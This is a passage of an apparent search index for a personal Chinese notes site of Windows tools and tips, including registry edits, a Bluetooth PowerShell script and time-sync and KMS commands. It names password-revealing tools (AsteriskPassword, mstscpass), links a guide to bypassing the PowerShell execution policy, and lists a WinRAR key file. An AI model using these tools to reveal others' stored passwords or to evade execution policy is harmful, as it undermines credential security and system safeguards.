\u5b89\u88c5\u540e\u6700\u4e3a\u6709\u7528\u7684\u4e91\u5019\u9009\u529f\u80fd\u7531\u4e8e\u9700\u8981\u914d\u7f6e\u4ee3\u7406\u624d\u80fd\u7528\uff0c\u914d\u7f6e\u65b9\u6cd5\uff1a \u6253\u5f00\u4e00\u4e2aterminal\uff08\u5efa\u8bae\u542f\u52a8\u4e00\u4e2ascreen\uff09\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u7136\u540e\u91cd\u542ffcitx\uff1a export http_proxy = \"http://127.0.0.1:8118\" export https_proxy = \"http://127.0.0.1:8118\" fcitx - r","title":"\u5b89\u88c5Google\u62fc\u97f3\u5e76\u914d\u7f6e\u4ee3\u7406"},{"location":"WindowsSoftware/","text":"Windows Software \u00b6 \u81ea\u5df1\u65e5\u5e38\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u54af Emeditor \u00b6 https://www.emeditor.com/ \u4e0b\u8f7d\uff1ahttp://files.emeditor.com/emed64_16.3.1.exe \u6253\u5f00\u8d85\u5927\u6587\u4ef6\uff0c\u8bed\u6cd5\u9ad8\u4eae\uff0c\u6279\u5904\u7406\u66ff\u6362\u7b49\u597d\u7528\u7684\u529f\u80fd Everything \u00b6 https://www.voidtools.com/ \u4e0b\u8f7d\uff1ahttps://www.voidtools.com/Everything-1.4.1.809b.x64.zip \u5feb\u901f\u5168\u76d8\u641c\u7d22\uff0c\u4e0d\u77e5\u9053\u6bd4windows\u81ea\u5e26\u7684\u641c\u7d22\u5feb\u5230\u54ea\u91cc\u53bb\u4e86 Sysinternals Utilities \u00b6 https://technet.microsoft.com/en-us/sysinternals/bb545027 \u4efb\u52a1\u7ba1\u7406\u5668 https://download.sysinternals.com/files/ProcessExplorer.zip CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668 \u00b6 \u4e0b\u8f7d\uff1ahttps://github.com/AlDanial/cloc/releases/download/v1.70/cloc-1.70.exe Cloc\u662f\u4e00\u6b3e\u4f7f\u7528Perl\u8bed\u8a00\u5f00\u53d1\u7684\u5f00\u6e90\u4ee3\u7801\u7edf\u8ba1\u5de5\u5177\uff0c\u652f\u6301\u591a\u5e73\u53f0\u4f7f\u7528\u3001\u591a\u8bed\u8a00\u8bc6\u522b\uff0c\u80fd\u591f\u8ba1\u7b97\u6307\u5b9a\u76ee\u6807\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\u6570(files)\u3001\u7a7a\u767d\u884c\u6570(blank)\u3001\u6ce8\u91ca\u884c\u6570(comment)\u548c\u4ee3\u7801\u884c\u6570(code)\u3002 MenuMgr \u53f3\u952e\u83dc\u5355\u7ba1\u7406 \u00b6 \u8fd8\u53f3\u952e\u83dc\u5355\u4e00\u4efd\u6e05\u51c0 MenuMgr \u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u6dfb\u52a0bash \u00b6 \u53d1\u73b0\u81ea\u5df1\u7ecf\u5e38\u9700\u8981\u5728\u5f53\u524d\u8def\u5f84\u4e0b\u6253\u5f00bash\uff0c\u4e4b\u524d\u6211\u90fd\u662f\u5728\u5730\u5740\u680f\u8f93\u5165bash\u56de\u8f66 \u4f46\u8fd9\u6837\u7684\u526f\u4f5c\u7528\u662f\u4e0d\u80fd\u518d\u65b9\u4fbf\u5730\u590d\u5236\u5f53\u524d\u8def\u5f84\u4e86 \u73b0\u5728\u6211\u5c06bash\u6dfb\u52a0\u5230\u53f3\u952e\u83dc\u5355 \u53ea\u9700\u9f20\u6807\u70b9\u51fb\u4e24\u6b21\u5373\u53ef\u6253\u5f00bash regedit\u5b9a\u4f4d\u5230 \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\ \u65b0\u5efa\u9879bash \u518d\u5728bash\u4e2d\u65b0\u5efa\u9879command \u4fee\u6539command\u7684\u9ed8\u8ba4\u4e3a bash \u987a\u5e26\u53ef\u4ee5\u628a\u5728\u6b64\u5904\u6253\u5f00\u547d\u4ee4\u7a97\u53e3\u7ed9\u663e\u793a\u51fa\u6765\uff1a\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\u9762\u6709\u4e2acmd \u4f46\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u9879 \u5220\u6389\u5373\u53ef \u5982\u679c\u4fee\u6539\u6ce8\u518c\u8868\u6ca1\u6709\u6743\u9650\uff0c\u53f3\u952e\u6539\u6743\u9650 \u5148\u6539\u6240\u6709\u8005\u518d\u5bf9everyone\u5141\u8bb8\u5b8c\u5168\u63a7\u5236\u5373\u53ef \u8f6f\u5a92U\u76d8\u542f\u52a8\u76d8\u5236\u4f5c \u00b6 usbbooter.exe WinRAR \u00b6 \u538b\u7f29\u89e3\u538b\u7f29\uff0c\u6211\u53ea\u7528WinRAR\u548c7zip winrar.exe winrar32bit.exe rarreg.key BurpSuite \u00b6 \u53d1\u73b0app\u7684\u6f0f\u6d1e\u5565\u7684\uff0c\u8fd8\u662f\u633a\u6709\u7528\u7684~ burpsuite v1.7.11.zip \u4f7f\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5Java\uff0c\u542f\u52a8\u540e\u8bbe\u7f6e\u76d1\u542c\u5728\u6240\u6709\u7f51\u5361\uff0c\u5bfc\u51fa\u8bc1\u4e66CA.crt\u53d1\u9001\u5230\u624b\u673a\uff0c\u624b\u673a\u5bfc\u5165\u8bc1\u4e66\uff0c\u624b\u673a\u5fd8\u8bb0Wifi\u540e\u8fde\u63a5wifi\u65f6\u8bbe\u7f6e\u4ee3\u7406\uff0c\u624b\u673a\u542f\u52a8APP\uff0c\u67e5\u770b\u6d41\u91cf\u54af~ BEncode Editor \u00b6 \u521b\u5efa/\u7f16\u8f91\u79cd\u5b50\u4fe1\u606f\uff0c\u505a\u4e00\u4e2a\u52e4\u594b\u7684\u642c\u8fd0\u5de5\u2026 BEncode Editor.exe Win10 Windows\u7167\u7247\u67e5\u770b\u5668 \u00b6 From: http://www.xitongcheng.com/jiaocheng/win10_article_12240.html Win+R\u6253\u5f00regedit\uff0c\u627e\u5230HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations \u53f3\u952e\uff0c\u65b0\u5efa\u5b57\u7b26\u4e32\u503c\uff0c\u547d\u540d\u4e3a.jpg\uff0c\u503c\u4e3aPhotoViewer.FileAssoc.Tiff \u6211\u7684\u60c5\u51b5\u662f\u539f\u5148\u6709.tif\u548c.tiff\u7684\uff0c\u8fd8\u9700\u8981\u65b0\u5efa\u8fd9\u4e9b\u540e\u7f00\u540d.jpeg .bmp .png .gif \u521b\u5efa\u540e\u518d\u770b\u6253\u5f00\u65b9\u5f0f\u5c31\u6709\u4e86Windows\u7167\u7247\u67e5\u770b\u5668 \u661f\u53f7\u5bc6\u7801\u67e5\u770b \u00b6 \u4e00\u822c\u662f\u7528\u4e0d\u7740 AsteriskPassword.exe \u8fdc\u7a0b\u8fde\u63a5\u5bc6\u7801\u67e5\u770b \u00b6 mstscpass.exe GHO\u6587\u4ef6\u67e5\u770b \u00b6 \u4e5f\u662f\u5f88\u4e45\u6ca1\u7528\u4e86\u554a Ghostexp.exe \u6587\u4ef6\u54c8\u5e0c\u8ba1\u7b97 \u00b6 Linux\u4e0b\u76f4\u63a5\u7528md5sum sha1sum\u5c31\u591f\u4e86 Hash.exe tcping \u68c0\u6d4b\u7aef\u53e3\u662f\u5426\u5f00\u653e \u00b6 \u4e00\u76f4ping\u7684\u7528\u6cd5: tcping -t py3.io 443 tcping.exe Nginx 1.11.8 \u00b6 nginx.zip Bash On Win10 \u00b6 mount\u6302\u8f7d\u5176\u4ed6\u5206\u533a \u00b6 mount -t drvfs D: /mnt/d VMware vCenter Converter \u00b6 \u65e0\u9700\u5173\u673a\uff0c\u65e0\u9700\u79fb\u52a8\u786c\u76d8\u5c06\u7269\u7406\u673a\u8f6c\u4e3a\u865a\u62df\u673a\u955c\u50cf \u57fa\u4e8eWindows\u7684\u5377\u5f71\u590d\u5236\u529f\u80fd http://www.softpedia.com/get/System/System-Miscellaneous/VMware-Converter.shtml \u547d\u4ee4\u884c\u5f00\u5173\u84dd\u7259 powershell \u00b6 \u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/https://superuser.com/questions/1168551/turn-on-off-bluetooth-radio-adapter-from-cmd-powershell-in-windows-10 \u7ed5\u8fc7powershell\u6267\u884c\u5b89\u5168\u7b56\u7565\u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ \u5c06\u8fd9\u4e2a\u4fdd\u5b58\u4e3ab.ps1 [ CmdletBinding() ] Param ( [ Parameter(Mandatory=$true) ][ ValidateSet('Off', 'On') ][ string ] $ BluetoothStatus ) If (( Get - Service bthserv ). Status - eq 'Stopped' ) { Start - Service bthserv } Add - Type - AssemblyName System . Runtime . WindowsRuntime $ asTaskGeneric = ( [ System.WindowsRuntimeSystemExtensions ] . GetMethods () | ? { $ _ . Name - eq 'AsTask' - and $ _ . GetParameters (). Count - eq 1 - and $ _ . GetParameters () [ 0 ] . ParameterType . Name - eq 'IAsyncOperation`1' } ) [ 0 ] Function Await ( $ WinRtTask , $ ResultType ) { $ asTask = $ asTaskGeneric . MakeGenericMethod ( $ ResultType ) $ netTask = $ asTask . Invoke ( $ null , @ ( $ WinRtTask )) $ netTask . Wait ( - 1 ) | Out - Null $ netTask . Result } [ Windows.Devices.Radios.Radio,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null [ Windows.Devices.Radios.RadioAccessStatus,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null Await ( [ Windows.Devices.Radios.Radio ]:: RequestAccessAsync ()) ( [ Windows.Devices.Radios.RadioAccessStatus ] ) | Out - Null $ radios = Await ( [ Windows.Devices.Radios.Radio ]:: GetRadiosAsync ()) ( [ System.Collections.Generic.IReadOnlyList[Windows.Devices.Radios.Radio ] ] ) $ bluetooth = $ radios | ? { $ _ . Kind - eq 'Bluetooth' } [ Windows.Devices.Radios.RadioState,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null Await ( $ bluetooth . SetStateAsync ( $ BluetoothStatus )) ( [ Windows.Devices.Radios.RadioAccessStatus ] ) | Out - Null \u5f00\u542f\u84dd\u7259\uff1a powershell -ExecutionPolicy Bypass -File ./b.ps1 -BluetoothStatus On \u5173\u95ed\u5c31\u662fOff \u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u76f4\u63a5\u663e\u793abash \u00b6 \u9ed8\u8ba4\u9700\u8981\u6309\u4f4fShift\u53f3\u952e\u624d\u4f1a\u663e\u793a HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\WSL \u5220\u9664\u5176\u4e2d\u7684Extended\u9879\u5373\u53ef\uff0c\u53ef\u80fd\u6ca1\u6709\u6743\u9650\u9700\u8981\u5148\u83b7\u5f97\u6240\u6709\u6743\u518d\u7ed9\u81ea\u5df1\u6743\u9650\uff0c \u53c2\u8003 \u9644\u4e0a\u9ed8\u8ba4\u7684command: wsl.exe --cd \"%V\" powershell.exe -noexit -command Set-Location -literalPath '%V' cmd.exe /s /k pushd \"%V\" sshfs\u6302\u8f7d\u8fdc\u7a0b\u76ee\u5f55 \u00b6 https://github.com/billziss-gh/sshfs-win \u76f8\u6bd4\u7384\u5b66\u7684windows\u5171\u4eab\uff0c\u8fd8\u662fssh\u66f4\u52a0\u7b80\u5355\u9760\u8c31\uff0c\u53ea\u662f\u6709\u65f6\u5019ssh.exe\u4f1aCPU100%\u5361\u4f4f\uff0c\u9700\u8981\u4efb\u52a1\u7ba1\u7406\u5668kill \u4f7f\u7528\u524d\u9700\u8981\u5148\u8ba9ssh\u5f00\u542f\u5bc6\u7801\u9a8c\u8bc1\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 ssh -i /dev/null \u53bb\u8fde\u63a5\u6d4b\u8bd5\u80fd\u5426\u767b\u5f55 \u53ef\u4ee5\u7528\u591a\u4e2a ..\\ \u6302\u8f7d\u4e0a\u7ea7\u76ee\u5f55 net use h: \\\\sshfs\\root@ip!2222\\..\\ \u547d\u4ee4\u884cwindows\u65f6\u95f4\u540c\u6b65 \u00b6 \u53c2\u8003\uff1a https://answers.microsoft.com/en-us/windows/forum/windows_10-other_settings/how-to-force-windows-10-time-to-synch-with-a-time/20f3b546-af38-42fb-a2d0-d4df13cc8f43 net start w32time w32tm /register w32tm /resync \u540c\u65f6\uff0c\u4f60\u53ef\u80fd\u60f3\u8981\u5c06Windows Time\u670d\u52a1\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u542f\u52a8 Windows\u6fc0\u6d3b \u00b6 \u67e5\u770b\u6fc0\u6d3b\u4fe1\u606f\uff1a slmgr.vbs /dli \u8bbe\u7f6ekms\u670d\u52a1\u5668\u5730\u5740\uff1a slmgr.vbs /skms 10.203.8.58 slmgr.vbs /ato \u67e5\u770b\u8fc7\u671f\u65f6\u95f4\uff1a slmgr.vbs /xpr \u67e5\u770bBitLocker\u52a0\u5bc6\u8fdb\u5ea6 \u00b6 \u65b0\u7684win10\u91cc\u4e0d\u4f1a\u5728UI\u663e\u793a\u52a0\u5bc6\u8fdb\u5ea6\uff0c\u53ea\u80fd\u9760\u7ba1\u7406\u5458\u6743\u9650\u7684\u547d\u4ee4\u884c\u67e5\u8be2\uff1a manage-bde -status \u627e\u56de\u6d88\u5931\u7684\u7a97\u53e3 \u00b6 \u53c2\u8003 Windows\u7cfb\u7edf\u7a97\u53e3\u6d88\u5931\u4e4b\u8c1c\u53ca\u89e3\u51b3\u65b9\u6cd5 \u611f\u53f9\u4e00\u4e0bwindows\u7684\u5411\u4e0b\u517c\u5bb9\u505a\u5f97\u771f\u597d\uff0c2009\u5e74\u7684\u6587\u7ae0\u73b0\u5728\u4ecd\u7136\u6709\u6548 Win10\u4efb\u52a1\u680f\u53f3\u952e\u6ca1\u6cd5\u5bf9\u7a97\u53e3\u8fdb\u884c\u79fb\u52a8\u4e86\uff0c\u89e3\u51b3\u65b9\u6848\u662f\u70b9\u51fb\u540eAlt+\u7a7a\u683c\uff0c\u7136\u540e\u6309M\uff0c\u6309\u65b9\u5411\u952e\uff0c\u518d\u79fb\u52a8\u9f20\u6807\u5373\u53ef","title":"WindowsSoftware"},{"location":"WindowsSoftware/#windows-software","text":"\u81ea\u5df1\u65e5\u5e38\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u54af","title":"Windows Software"},{"location":"WindowsSoftware/#emeditor","text":"https://www.emeditor.com/ \u4e0b\u8f7d\uff1ahttp://files.emeditor.com/emed64_16.3.1.exe \u6253\u5f00\u8d85\u5927\u6587\u4ef6\uff0c\u8bed\u6cd5\u9ad8\u4eae\uff0c\u6279\u5904\u7406\u66ff\u6362\u7b49\u597d\u7528\u7684\u529f\u80fd","title":"Emeditor"},{"location":"WindowsSoftware/#everything","text":"https://www.voidtools.com/ \u4e0b\u8f7d\uff1ahttps://www.voidtools.com/Everything-1.4.1.809b.x64.zip \u5feb\u901f\u5168\u76d8\u641c\u7d22\uff0c\u4e0d\u77e5\u9053\u6bd4windows\u81ea\u5e26\u7684\u641c\u7d22\u5feb\u5230\u54ea\u91cc\u53bb\u4e86","title":"Everything"},{"location":"WindowsSoftware/#sysinternals-utilities","text":"https://technet.microsoft.com/en-us/sysinternals/bb545027 \u4efb\u52a1\u7ba1\u7406\u5668 https://download.sysinternals.com/files/ProcessExplorer.zip","title":"Sysinternals Utilities"},{"location":"WindowsSoftware/#cloc","text":"\u4e0b\u8f7d\uff1ahttps://github.com/AlDanial/cloc/releases/download/v1.70/cloc-1.70.exe Cloc\u662f\u4e00\u6b3e\u4f7f\u7528Perl\u8bed\u8a00\u5f00\u53d1\u7684\u5f00\u6e90\u4ee3\u7801\u7edf\u8ba1\u5de5\u5177\uff0c\u652f\u6301\u591a\u5e73\u53f0\u4f7f\u7528\u3001\u591a\u8bed\u8a00\u8bc6\u522b\uff0c\u80fd\u591f\u8ba1\u7b97\u6307\u5b9a\u76ee\u6807\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\u6570(files)\u3001\u7a7a\u767d\u884c\u6570(blank)\u3001\u6ce8\u91ca\u884c\u6570(comment)\u548c\u4ee3\u7801\u884c\u6570(code)\u3002","title":"CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668"},{"location":"WindowsSoftware/#menumgr","text":"\u8fd8\u53f3\u952e\u83dc\u5355\u4e00\u4efd\u6e05\u51c0 MenuMgr","title":"MenuMgr \u53f3\u952e\u83dc\u5355\u7ba1\u7406"},{"location":"WindowsSoftware/#bash","text":"\u53d1\u73b0\u81ea\u5df1\u7ecf\u5e38\u9700\u8981\u5728\u5f53\u524d\u8def\u5f84\u4e0b\u6253\u5f00bash\uff0c\u4e4b\u524d\u6211\u90fd\u662f\u5728\u5730\u5740\u680f\u8f93\u5165bash\u56de\u8f66 \u4f46\u8fd9\u6837\u7684\u526f\u4f5c\u7528\u662f\u4e0d\u80fd\u518d\u65b9\u4fbf\u5730\u590d\u5236\u5f53\u524d\u8def\u5f84\u4e86 \u73b0\u5728\u6211\u5c06bash\u6dfb\u52a0\u5230\u53f3\u952e\u83dc\u5355 \u53ea\u9700\u9f20\u6807\u70b9\u51fb\u4e24\u6b21\u5373\u53ef\u6253\u5f00bash regedit\u5b9a\u4f4d\u5230 \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\ \u65b0\u5efa\u9879bash \u518d\u5728bash\u4e2d\u65b0\u5efa\u9879command \u4fee\u6539command\u7684\u9ed8\u8ba4\u4e3a bash \u987a\u5e26\u53ef\u4ee5\u628a\u5728\u6b64\u5904\u6253\u5f00\u547d\u4ee4\u7a97\u53e3\u7ed9\u663e\u793a\u51fa\u6765\uff1a\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\u9762\u6709\u4e2acmd \u4f46\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u9879 \u5220\u6389\u5373\u53ef \u5982\u679c\u4fee\u6539\u6ce8\u518c\u8868\u6ca1\u6709\u6743\u9650\uff0c\u53f3\u952e\u6539\u6743\u9650 \u5148\u6539\u6240\u6709\u8005\u518d\u5bf9everyone\u5141\u8bb8\u5b8c\u5168\u63a7\u5236\u5373\u53ef","title":"\u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u6dfb\u52a0bash"},{"location":"WindowsSoftware/#u","text":"usbbooter.exe","title":"\u8f6f\u5a92U\u76d8\u542f\u52a8\u76d8\u5236\u4f5c"},{"location":"WindowsSoftware/#winrar","text":"\u538b\u7f29\u89e3\u538b\u7f29\uff0c\u6211\u53ea\u7528WinRAR\u548c7zip winrar.exe winrar32bit.exe rarreg.key","title":"WinRAR"},{"location":"WindowsSoftware/#burpsuite","text":"\u53d1\u73b0app\u7684\u6f0f\u6d1e\u5565\u7684\uff0c\u8fd8\u662f\u633a\u6709\u7528\u7684~ burpsuite v1.7.11.zip \u4f7f\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5Java\uff0c\u542f\u52a8\u540e\u8bbe\u7f6e\u76d1\u542c\u5728\u6240\u6709\u7f51\u5361\uff0c\u5bfc\u51fa\u8bc1\u4e66CA.crt\u53d1\u9001\u5230\u624b\u673a\uff0c\u624b\u673a\u5bfc\u5165\u8bc1\u4e66\uff0c\u624b\u673a\u5fd8\u8bb0Wifi\u540e\u8fde\u63a5wifi\u65f6\u8bbe\u7f6e\u4ee3\u7406\uff0c\u624b\u673a\u542f\u52a8APP\uff0c\u67e5\u770b\u6d41\u91cf\u54af~","title":"BurpSuite"},{"location":"WindowsSoftware/#bencode-editor","text":"\u521b\u5efa/\u7f16\u8f91\u79cd\u5b50\u4fe1\u606f\uff0c\u505a\u4e00\u4e2a\u52e4\u594b\u7684\u642c\u8fd0\u5de5\u2026 BEncode Editor.exe","title":"BEncode Editor"},{"location":"WindowsSoftware/#win10-windows","text":"From: http://www.xitongcheng.com/jiaocheng/win10_article_12240.html Win+R\u6253\u5f00regedit\uff0c\u627e\u5230HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations \u53f3\u952e\uff0c\u65b0\u5efa\u5b57\u7b26\u4e32\u503c\uff0c\u547d\u540d\u4e3a.jpg\uff0c\u503c\u4e3aPhotoViewer.FileAssoc.Tiff \u6211\u7684\u60c5\u51b5\u662f\u539f\u5148\u6709.tif\u548c.tiff\u7684\uff0c\u8fd8\u9700\u8981\u65b0\u5efa\u8fd9\u4e9b\u540e\u7f00\u540d.jpeg .bmp .png .gif \u521b\u5efa\u540e\u518d\u770b\u6253\u5f00\u65b9\u5f0f\u5c31\u6709\u4e86Windows\u7167\u7247\u67e5\u770b\u5668","title":"Win10 Windows\u7167\u7247\u67e5\u770b\u5668"},{"location":"WindowsSoftware/#_1","text":"\u4e00\u822c\u662f\u7528\u4e0d\u7740 AsteriskPassword.exe","title":"\u661f\u53f7\u5bc6\u7801\u67e5\u770b"},{"location":"WindowsSoftware/#_2","text":"mstscpass.exe","title":"\u8fdc\u7a0b\u8fde\u63a5\u5bc6\u7801\u67e5\u770b"},{"location":"WindowsSoftware/#gho","text":"\u4e5f\u662f\u5f88\u4e45\u6ca1\u7528\u4e86\u554a Ghostexp.exe","title":"GHO\u6587\u4ef6\u67e5\u770b"},{"location":"WindowsSoftware/#_3","text":"Linux\u4e0b\u76f4\u63a5\u7528md5sum sha1sum\u5c31\u591f\u4e86 Hash.exe","title":"\u6587\u4ef6\u54c8\u5e0c\u8ba1\u7b97"},{"location":"WindowsSoftware/#tcping","text":"\u4e00\u76f4ping\u7684\u7528\u6cd5: tcping -t py3.io 443 tcping.exe","title":"tcping \u68c0\u6d4b\u7aef\u53e3\u662f\u5426\u5f00\u653e"},{"location":"WindowsSoftware/#nginx-1118","text":"nginx.zip","title":"Nginx 1.11.8"},{"location":"WindowsSoftware/#bash-on-win10","text":"","title":"Bash On Win10"},{"location":"WindowsSoftware/#mount","text":"mount -t drvfs D: /mnt/d","title":"mount\u6302\u8f7d\u5176\u4ed6\u5206\u533a"},{"location":"WindowsSoftware/#vmware-vcenter-converter","text":"\u65e0\u9700\u5173\u673a\uff0c\u65e0\u9700\u79fb\u52a8\u786c\u76d8\u5c06\u7269\u7406\u673a\u8f6c\u4e3a\u865a\u62df\u673a\u955c\u50cf \u57fa\u4e8eWindows\u7684\u5377\u5f71\u590d\u5236\u529f\u80fd http://www.softpedia.com/get/System/System-Miscellaneous/VMware-Converter.shtml","title":"VMware vCenter Converter"},{"location":"WindowsSoftware/#powershell","text":"\u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/https://superuser.com/questions/1168551/turn-on-off-bluetooth-radio-adapter-from-cmd-powershell-in-windows-10 \u7ed5\u8fc7powershell\u6267\u884c\u5b89\u5168\u7b56\u7565\u53c2\u8003\uff1a https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ \u5c06\u8fd9\u4e2a\u4fdd\u5b58\u4e3ab.ps1 [ CmdletBinding() ] Param ( [ Parameter(Mandatory=$true) ][ ValidateSet('Off', 'On') ][ string ] $ BluetoothStatus ) If (( Get - Service bthserv ). Status - eq 'Stopped' ) { Start - Service bthserv } Add - Type - AssemblyName System . Runtime . WindowsRuntime $ asTaskGeneric = ( [ System.WindowsRuntimeSystemExtensions ] . GetMethods () | ? { $ _ . Name - eq 'AsTask' - and $ _ . GetParameters (). Count - eq 1 - and $ _ . GetParameters () [ 0 ] . ParameterType . Name - eq 'IAsyncOperation`1' } ) [ 0 ] Function Await ( $ WinRtTask , $ ResultType ) { $ asTask = $ asTaskGeneric . MakeGenericMethod ( $ ResultType ) $ netTask = $ asTask . Invoke ( $ null , @ ( $ WinRtTask )) $ netTask . Wait ( - 1 ) | Out - Null $ netTask . Result } [ Windows.Devices.Radios.Radio,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null [ Windows.Devices.Radios.RadioAccessStatus,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null Await ( [ Windows.Devices.Radios.Radio ]:: RequestAccessAsync ()) ( [ Windows.Devices.Radios.RadioAccessStatus ] ) | Out - Null $ radios = Await ( [ Windows.Devices.Radios.Radio ]:: GetRadiosAsync ()) ( [ System.Collections.Generic.IReadOnlyList[Windows.Devices.Radios.Radio ] ] ) $ bluetooth = $ radios | ? { $ _ . Kind - eq 'Bluetooth' } [ Windows.Devices.Radios.RadioState,Windows.System.Devices,ContentType=WindowsRuntime ] | Out - Null Await ( $ bluetooth . SetStateAsync ( $ BluetoothStatus )) ( [ Windows.Devices.Radios.RadioAccessStatus ] ) | Out - Null \u5f00\u542f\u84dd\u7259\uff1a powershell -ExecutionPolicy Bypass -File ./b.ps1 -BluetoothStatus On \u5173\u95ed\u5c31\u662fOff","title":"\u547d\u4ee4\u884c\u5f00\u5173\u84dd\u7259 powershell"},{"location":"WindowsSoftware/#bash_1","text":"\u9ed8\u8ba4\u9700\u8981\u6309\u4f4fShift\u53f3\u952e\u624d\u4f1a\u663e\u793a HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\WSL \u5220\u9664\u5176\u4e2d\u7684Extended\u9879\u5373\u53ef\uff0c\u53ef\u80fd\u6ca1\u6709\u6743\u9650\u9700\u8981\u5148\u83b7\u5f97\u6240\u6709\u6743\u518d\u7ed9\u81ea\u5df1\u6743\u9650\uff0c \u53c2\u8003 \u9644\u4e0a\u9ed8\u8ba4\u7684command: wsl.exe --cd \"%V\" powershell.exe -noexit -command Set-Location -literalPath '%V' cmd.exe /s /k pushd \"%V\"","title":"\u6587\u4ef6\u5939\u80cc\u666f\u53f3\u952e\u76f4\u63a5\u663e\u793abash"},{"location":"WindowsSoftware/#sshfs","text":"https://github.com/billziss-gh/sshfs-win \u76f8\u6bd4\u7384\u5b66\u7684windows\u5171\u4eab\uff0c\u8fd8\u662fssh\u66f4\u52a0\u7b80\u5355\u9760\u8c31\uff0c\u53ea\u662f\u6709\u65f6\u5019ssh.exe\u4f1aCPU100%\u5361\u4f4f\uff0c\u9700\u8981\u4efb\u52a1\u7ba1\u7406\u5668kill \u4f7f\u7528\u524d\u9700\u8981\u5148\u8ba9ssh\u5f00\u542f\u5bc6\u7801\u9a8c\u8bc1\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 ssh -i /dev/null \u53bb\u8fde\u63a5\u6d4b\u8bd5\u80fd\u5426\u767b\u5f55 \u53ef\u4ee5\u7528\u591a\u4e2a ..\\ \u6302\u8f7d\u4e0a\u7ea7\u76ee\u5f55 net use h: \\\\sshfs\\root@ip!2222\\..\\","title":"sshfs\u6302\u8f7d\u8fdc\u7a0b\u76ee\u5f55"},{"location":"WindowsSoftware/#windows","text":"\u53c2\u8003\uff1a https://answers.microsoft.com/en-us/windows/forum/windows_10-other_settings/how-to-force-windows-10-time-to-synch-with-a-time/20f3b546-af38-42fb-a2d0-d4df13cc8f43 net start w32time w32tm /register w32tm /resync \u540c\u65f6\uff0c\u4f60\u53ef\u80fd\u60f3\u8981\u5c06Windows Time\u670d\u52a1\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u542f\u52a8","title":"\u547d\u4ee4\u884cwindows\u65f6\u95f4\u540c\u6b65"},{"location":"WindowsSoftware/#windows_1","text":"\u67e5\u770b\u6fc0\u6d3b\u4fe1\u606f\uff1a slmgr.vbs /dli \u8bbe\u7f6ekms\u670d\u52a1\u5668\u5730\u5740\uff1a slmgr.vbs /skms 10.203.8.58 slmgr.vbs /ato \u67e5\u770b\u8fc7\u671f\u65f6\u95f4\uff1a slmgr.vbs /xpr","title":"Windows\u6fc0\u6d3b"},{"location":"WindowsSoftware/#bitlocker","text":"\u65b0\u7684win10\u91cc\u4e0d\u4f1a\u5728UI\u663e\u793a\u52a0\u5bc6\u8fdb\u5ea6\uff0c\u53ea\u80fd\u9760\u7ba1\u7406\u5458\u6743\u9650\u7684\u547d\u4ee4\u884c\u67e5\u8be2\uff1a manage-bde -status","title":"\u67e5\u770bBitLocker\u52a0\u5bc6\u8fdb\u5ea6"},{"location":"WindowsSoftware/#_4","text":"\u53c2\u8003 Windows\u7cfb\u7edf\u7a97\u53e3\u6d88\u5931\u4e4b\u8c1c\u53ca\u89e3\u51b3\u65b9\u6cd5 \u611f\u53f9\u4e00\u4e0bwindows\u7684\u5411\u4e0b\u517c\u5bb9\u505a\u5f97\u771f\u597d\uff0c2009\u5e74\u7684\u6587\u7ae0\u73b0\u5728\u4ecd\u7136\u6709\u6548 Win10\u4efb\u52a1\u680f\u53f3\u952e\u6ca1\u6cd5\u5bf9\u7a97\u53e3\u8fdb\u884c\u79fb\u52a8\u4e86\uff0c\u89e3\u51b3\u65b9\u6848\u662f\u70b9\u51fb\u540eAlt+\u7a7a\u683c\uff0c\u7136\u540e\u6309M\uff0c\u6309\u65b9\u5411\u952e\uff0c\u518d\u79fb\u52a8\u9f20\u6807\u5373\u53ef","title":"\u627e\u56de\u6d88\u5931\u7684\u7a97\u53e3"},{"location":"cURL/","text":"cURL \u00b6 curl\u8fd9\u4e48\u6709\u7528\u7684\u4e1c\u897f\uff0c\u8fd8\u662f\u5355\u72ec\u5f00\u4e2a\u6587\u6863\u54af~ 